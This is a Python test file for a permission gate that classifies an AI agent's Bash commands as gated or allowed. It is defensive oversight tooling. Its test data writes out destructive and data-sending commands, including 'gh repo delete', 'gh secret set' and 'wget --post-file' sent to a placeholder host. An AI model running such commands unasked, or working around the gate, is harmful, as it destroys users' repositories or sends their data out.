    ("gh api repos/o/r/issues -f title=x", "gh_api_write"),
    ("gh api repos/o/r/issues --input body.json", "gh_api_write"),
    ("gh api graphql -f query='mutation { x }'", "gh_api_graphql_mutation"),
    ("gh release create v1.0", "gh_release_create"),
    ("gh -R o/r secret set TOKEN", "gh_secret_set"),
    ("gh repo delete o/r --yes", "gh_repo_delete"),
    ("gh run rerun 123", "gh_run_rerun"),
    ("gh issue delete 5", "gh_issue_delete"),
    ("wget --post-data=a=1 https://x.example.com", "wget_mutating"),
    ("wget --post-file=body.json https://x.example.com", "wget_mutating"),
    ("wget --method=PUT https://x.example.com", "wget_mutating"),
    ("wget --method PATCH https://x.example.com --body-data=a", "wget_mutating"),
])
def test_gh_and_wget_writes_are_gated(command, cls):
    got, gated = gate.classify("Bash", {"command": command})
    assert gated and got == cls, (command, got)


@pytest.mark.parametrize("command", [
    "gh pr create --title x --body y",
    "gh pr comment 5 -b hi",
    "gh pr view 5", "gh pr list", "gh pr checks 5", "gh issue list", "gh issue create -t x",
    "gh api repos/o/r/issues",
    "gh api graphql -f query='query { viewer { login } }'",
    "gh run list", "gh workflow list", "gh release list",
    "wget -q https://x.example.com/file.tar.gz",
    "wget --post-data=a=1 http://127.0.0.1:8000/x",
])
def test_gh_and_wget_reads_and_the_daily_pr_flow_are_not_gated(command):
    assert gate.classify("Bash", {"command": command}) == (None, False), command


def test_gh_pr_merge_is_ledgered_and_never_refused():
    assert gate.classify("Bash", {"command": "gh pr merge 5 --merge"}) == ("gh_pr_merge", False)
    assert gate.classify("Bash", {"command": "gh -R o/r pr merge 5 --squash"}) == ("gh_pr_merge", False)


def test_a_gated_gh_call_inside_a_chain_gates_the_whole_command():
    cls, gated = gate.classify("Bash", {"command": "git status && gh workflow run ci.yml 2>&1 | tail -3"})
    assert gated and "gh_workflow_run" in cls
